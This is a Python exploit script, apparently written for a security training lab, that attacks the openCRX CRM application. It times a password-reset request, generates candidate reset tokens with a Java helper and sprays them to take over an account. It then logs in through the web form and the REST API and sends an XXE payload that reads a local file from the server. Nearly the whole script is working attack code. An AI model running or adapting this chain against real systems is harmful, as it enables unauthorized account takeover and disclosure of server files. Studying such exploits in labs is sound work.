#!/usr/bin/python3
import base64
import sys
import xml.etree.ElementTree as ET
import vobject
import requests
import argparse
import subprocess
import re
from multiprocessing import Pool

RHOST = "192.168.239.126"
RPORT = ""
LHOST = ""
LPORT = ""
USERNAME = ""
PASSWORD_TO_RESET = ""

s = requests.session()

proxies = {
  "http": "http://127.0.0.1:8080"
}
def execute_bash_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print(f"Command '{command}' returned non-zero exit status {e.returncode}.")
        print(f"Error output:\n{e.stderr.decode('utf-8')}")
        return None


# Przykład użycia funkcji dla Twojego polecenia
def getEpochTime():
    command = "date +%s%3N && curl -s -i -X 'POST' --data-binary 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && date +%s%3N"
    output = execute_bash_command(command)
    lines = output.split("\n")

    # Pobieramy wartości start i stop time
    start_time = lines[0].strip()
    stop_time = lines[-2].strip()  # ostatnia linia, bez pustego pola na końcu

    # Wyświetlamy wartości
    print(f"[+] Start time: {start_time}")
    print(f"[+] Stop time: {stop_time}")

    # Parsujemy do int (long w kontekście Java)
    start_time = int(start_time)
    stop_time = int(stop_time)

    # Zwracamy wartości jako krotka
    return start_time, stop_time


def generateTokens(startTime, stopTime):
    # Wywołanie funkcji
    #createTokenFile()
    command = f"java OpenCRXToken {startTime} {stopTime} > tokens.txt"
    try:
        subprocess.run(command, shell=True, check=False)
        print("[+] Generated token list.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Błąd podczas wykonywania komendy Java: {e}")


def createTokenFile():
    file_name = "tokens.txt"
    try:
        with open(file_name, 'w') as file:
            pass  # Nie robimy żadnego zapisu, co spowoduje utworzenie pustego pliku
        print(f"Pusty plik '{file_name}' został pomyślnie utworzony.")
    except IOError:
        print(f"Wystąpił błąd podczas tworzenia pustego pliku '{file_name}'.")

def resetPassword():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--user', help='Username to target', required=True)
    parser.add_argument('-p', '--password', help='Password value to set', required=True)
    args = parser.parse_args()

    USERNAME = args.user
    PASSWORD_TO_RESET = args.password

    target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"

    print("Starting token spray. Standby.")
    with open("tokens.txt", "r") as f:
        for word in f:
            # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
            print(f"\r[+] Current token: {word.strip()}", end="")
            sys.stdout.flush()  # Ensure the output is flushed immediately
            payload = {'t': word.rstrip(), 'p': 'CRX', 's': 'Standard', 'id': args.user, 'password1': args.password, 'password2': args.password}

            r = s.post(url=target, data=payload)
            res = r.text

            if "Unable to reset password" not in res:
                print(f"Successful reset with token: {word.strip()}")
                break
        else:
            print("\nNo successful reset with any token.")


def apiAuthenticate(user, passwd):
    target = f"http://{RHOST}:8080"
    basicAuth = f"{user}:{passwd}"
    base64BasicAuth = base64.b64encode(basicAuth.encode()).decode()
    print("Encoded Basic Auth:", base64BasicAuth)
    headers = {
        "Authorization": "Basic " + base64BasicAuth,
    }
    print("[+] Attempting to authenticate to API with Basic Authorization")
    response = s.get(target + '/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/:api-ui',
                      headers=headers, proxies=proxies)

    # Print the request headers
    #print("Request Headers:")
    #print(response.request.headers)

    # Print the response details
    #print("Response Status Code:", response.status_code)
    #print("Response Headers:", response.headers)
    #print("Response Text:", response.text)

    if 'Set-Cookie' in response.headers:
        cookie = response.headers['Set-Cookie']
        jsessionid = cookie.split(';')[0].split('=')[1]
        #print("JSESSIONID:", jsessionid)
        return  jsessionid
    else:
        print("JSESSIONID not found in response headers.")
def authenticate(ip, user, passwd):
    print(USERNAME)
    print(PASSWORD_TO_RESET)
    target = "http://%s:8080" % ip
    data = {"j_username": user,
            "j_password": passwd}
    s.get(target + '/opencrx-core-CRX/ObjectInspectorServlet?loginFailed=false')
    print("[+] Attempting to authenticate with the applied credentials...")
    response = s.post(target + '/opencrx-core-CRX/j_security_check', data=data)
    res = response.text

    headersList = response.headers
    cookie = headersList.get('Set-Cookie')
    jsessionid_match = re.search(r'JSESSIONID=([^;]+)', cookie)

    if jsessionid_match:
        jsessionid = jsessionid_match.group(1)
        #print(f"JSESSIONID: {jsessionid}")
    else:
        print("JSESSIONID not found.")
    if "?requestId=" in res:
        print("[+] Login successful!")
        match = re.search(r"href='(.*?)';", res)
        if match:
            url = match.group(1)
            response = s.get(url)
            res = response.text
            user = re.search(r"<title>(.*?)</title>", res)
            if user:
                print(user.group(1))
            return jsessionid
    else:
        print("\n[!] Login failed.")


def xxe(cookie):
    headers = {"Cookie": f"JSESSIONID={cookie}"}
    target = ("http://192.168.239.126:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard"
              "/account")
    xxeTemplate = '''<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY ><!ENTITY lastname SYSTEM 
    "file:///home/student/crx">]><org.opencrx.kernel.account1.Contact><lastName>&lastname;</lastName><firstName>Tom
    </firstName></org.opencrx.kernel.account1.Contact>'''
    response = s.post(url=target, data=xxeTemplate, headers=headers, proxies=proxies)
    responseValue = response.text

    # Parsowanie XML
    root = ET.fromstring(responseValue)

    # Odczytanie wartości całego pola lastName
    last_name_cdata = root.find('.//lastName').text.strip()

    # Wyświetlenie wartości całego pola lastName
    print(f"[+] XXE Response Value:")
    print(last_name_cdata)


startTime, stoptime = getEpochTime()
generateTokens(startTime, stoptime)
resetPassword()
authenticate(RHOST, "guest", "password123")
cookie = apiAuthenticate("guest", "password123")
xxe(cookie)
